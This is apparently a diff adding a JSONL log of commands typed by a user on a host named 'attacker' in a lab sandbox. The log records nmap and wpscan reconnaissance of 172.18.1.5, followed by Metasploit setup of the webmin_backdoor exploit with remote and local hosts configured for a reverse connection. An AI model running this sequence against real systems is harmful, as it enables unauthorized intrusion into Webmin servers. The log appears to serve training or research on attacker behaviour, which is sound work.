@@ -1,0 +1,14 @@
+{"cmd_type":"bash-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:44:04.0+02:00","hostname":"attacker","cmd":".nmap 172.18.1.5","username":"root","wd":"/root","ip":"10.1.135.83"}
+{"cmd_type":"bash-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:44:15.0+02:00","hostname":"attacker","cmd":"nmap 172.18.1.5","username":"root","wd":"/root","ip":"10.1.135.83"}
+{"cmd_type":"bash-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:46:08.0+02:00","hostname":"attacker","cmd":"wpscan 172.18.1.5","username":"root","wd":"/root","ip":"10.1.135.83"}
+{"cmd_type":"bash-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:50:07.0+02:00","hostname":"attacker","cmd":"nmap -sV -p 10000 web ","username":"root","wd":"/root","ip":"10.1.135.83"}
+{"cmd_type":"bash-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:50:17.0+02:00","hostname":"attacker","cmd":"nmap --help","username":"root","wd":"/root","ip":"10.1.135.83"}
+{"cmd_type":"bash-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:54:06.0+02:00","hostname":"attacker","cmd":"ping web","username":"root","wd":"/root","ip":"10.1.135.83"}
+{"cmd_type":"bash-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:54:42.0+02:00","hostname":"attacker","cmd":"msfconsole","username":"root","wd":"/root","ip":"10.1.135.83"}
+{"cmd_type":"msf-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:55:29.0+02:00","hostname":"attacker","cmd":"set RHOST=172.18.1.5","ip":"10.1.135.83"}
+{"cmd_type":"msf-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:55:37.0+02:00","hostname":"attacker","cmd":"set RHOST 172.18.1.5","ip":"10.1.135.83"}
+{"cmd_type":"msf-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:57:40.0+02:00","hostname":"attacker","cmd":"use exploit/unix/webapp/webmin_backdoor","ip":"10.1.135.83"}
+{"cmd_type":"msf-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:59:44.0+02:00","hostname":"attacker","cmd":"search webmin","ip":"10.1.135.83"}
+{"cmd_type":"msf-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:59:52.0+02:00","hostname":"attacker","cmd":"use exploit/47230","ip":"10.1.135.83"}
+{"cmd_type":"msf-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T11:59:55.0+02:00","hostname":"attacker","cmd":"set rhost web","ip":"10.1.135.83"}
+{"cmd_type":"msf-command","pool_id":"1","sandbox_id":"205","timestamp_str":"2019-12-12T12:00:14.0+02:00","hostname":"attacker","cmd":"set lhost 10.1.135.83","ip":"10.1.135.83"}
